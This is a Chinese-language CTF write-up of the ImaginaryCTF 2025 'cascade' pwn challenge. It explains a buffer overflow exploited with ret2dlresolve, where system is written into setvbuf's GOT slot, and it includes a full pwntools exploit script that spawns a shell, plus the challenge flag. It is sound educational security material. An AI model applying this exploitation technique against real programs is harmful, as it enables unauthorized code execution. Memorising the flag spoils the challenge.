---
title: "Write-ups: ImaginaryCTF 2025"
published: 2025-09-19
updated: 2025-09-19
description: "Write-ups for ImaginaryCTF 2025 pwn aspect."
tags: ["Pwn", "Write-ups"]
category: "Write-ups"
draft: false
---

# cascade

## Information

- Category: Pwn
- Difficulty: Medium
- Points: 292

## Description

> just a buffer overflow, right?

## Write-up

64 字节的缓冲区，512 字节的输入，Partial RELRO，没 gadgets，没 libc……当时想到的就是打 `ret2dlresolve`，解析 system，最后虽然我成功带着参数进入了 system，并且执行 system 的过程中没有出现问题，但是却并没有得到 shell 。很费解，只记得当时调试到凌晨三点都没找到问题，可惜我已经把之前的 exp 删掉了……

后来看了下官方的 wp，也是 ret2dlresolve，并且和我一样都是用 pwntools 直接生成的 fake structures，甚至都是解析的 system，唯一的区别是我当时直接把 system 的参数也写到结构体里面了，当时也没搞明白是为啥，明明没有 rdi gadget 的，但它却可以自动设置一个参数，我也没用 rop 功能，就是手动调用。而官方 wp 是手动设置的参数。当时我并没有找到手动设置参数的方法……复现的时候才发现，原来那么简单。

其实我复现官方 wp 的时候，发现本地也还是打不通，虽然也成功执行了 system，不禁让我怀疑我当时是不是只要远程测试一下说不定就通了，我艹哦，感觉损失了一个亿，好难过……

ropper 发现，程序并没有控制参数的 gadgets，所以我们就算能解析出来 system 的地址也没用，还得想办法给它传参。

这好办，注意到 main 函数调用了两个 `setvbuf`，它们第一个参数都来自 bss 段：

```asm ins={10-21}
; Attributes: bp-based frame

; int __fastcall main(int argc, const char **argv, const char **envp)
public main
main proc near
; __unwind {
endbr64
push    rbp
mov     rbp, rsp
mov     rax, cs:stdout@GLIBC_2_2_5
mov     ecx, 0          ; n
mov     edx, 2          ; modes
mov     esi, 0          ; buf
mov     rdi, rax        ; stream
call    _setvbuf
mov     rax, cs:stdin@GLIBC_2_2_5
mov     ecx, 0          ; n
mov     edx, 2          ; modes
mov     esi, 0          ; buf
mov     rdi, rax        ; stream
call    _setvbuf
mov     eax, 0
call    vuln
mov     eax, 0
pop     rbp
retn
; } // starts at 40117B
main endp

_text ends
```

那我们只要能控制 bss 中 `stdin` 或者 `stdout` 的值就能控制 rdi 了。好巧不巧，没开 PIE，~这就是隐藏的人和产生的地利。~

接着思考应该让 ret2dlresolve 修改哪个 got 项呢？观察下面的 main 函数反编译代码，我们看到最开始调用了两个 setvbuf 。结合上面设置参数的方法，如果我们让 dlresolve 将解析出来的 system 地址写入 setvbuf 的 got 项，那我们只要返回到 main 就可以再次调用 setvbuf，而调用 setvbuf 会先设置参数，然后调用 system 。

策略就是这样，还是很简单的。

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 2, 0);
  vuln();
  return 0;
}
```

:::important
下面这个 payload 需要注意的地方是，`data_addr` 的地址我们可以在将 dlresolve payload 读进去之后动调确定，然后第二次 read 读入的 RBP 一定要设置的大点，不然后面在执行 dlresolve 解析的时候那些函数的 prologues 会将 RSP 缩小到只读地址，就会导致非法访问从而 abort 。
:::

## Exploit

```python
#!/usr/bin/env python3

from pwn import (
    ROP,
    Ret2dlresolvePayload,
    args,
    context,
    flat,
    process,
    raw_input,
    remote,
)


FILE = "./vuln"
HOST, PORT = "cascade.chal.imaginaryctf.org", 1337

context(log_level="debug", binary=FILE, terminal="kitty")

elf = context.binary
rop = ROP(elf)


def launch():
    global target
    if args.L:
        target = process(FILE)
    else:
        target = remote(HOST, PORT)


def main():
    launch()

    read = 0x401162
    dlresolve = Ret2dlresolvePayload(
        elf=elf,
        symbol="system",
        args=[],
        data_addr=0x404070,
        resolution_addr=elf.got["setvbuf"],
    )
    payload = flat(
        b"A" * 64,
        elf.sym["stdout"] + 0x40,
        read,
    ).ljust(0x200 - 1, b"\x00")

    raw_input("DEBUG")
    target.sendline(payload)

    rop.ret2dlresolve(dlresolve)
    rop.raw(rop.ret)
    rop.main()
    target.success(rop.dump())

    payload = flat(
        elf.sym["stdout"] + 0x8,  # /bin/sh address
        b"/bin/sh\x00",
        b"A" * 0x30,
        0x404F40,  # rbp
        read,
        dlresolve.payload,
    ).ljust(0x200 - 1, b"\x00")
    target.sendline(payload)

    payload = flat(
        b"A" * 0x40,
        b"B" * 0x8,  # rbp
        rop.chain(),
    ).ljust(0x200 - 1, b"\x00")
    target.sendline(payload)

    target.interactive()


if __name__ == "__main__":
    main()
```

## Flag

:spoiler[`ictf{i_h0pe_y0u_didnt_use_ret2dl_94b51175}`]
